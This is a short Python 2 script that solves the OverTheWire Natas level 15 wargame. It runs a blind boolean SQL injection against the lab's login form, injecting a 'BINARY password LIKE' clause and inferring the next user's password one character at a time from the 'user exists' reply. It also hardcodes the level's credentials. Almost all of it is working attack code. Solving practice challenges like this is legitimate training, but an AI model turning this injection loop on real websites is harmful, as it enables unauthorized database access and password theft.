#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re
from string import * 

characters = lowercase + uppercase + digits
print characters

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.get(url, auth = (username, password) )

seen_password = list('')
while ( True ):

	for ch in characters:

		print "trying with password", "".join(seen_password) + ch
		response = session.post(url, data = { "username" : 'natas16" AND BINARY password LIKE "' + "".join(seen_password) + ch + '%" # ' },auth = (username, password) )

		content = response.text

		if ( 'user exists' in content ):
			seen_password.append(ch)
			break

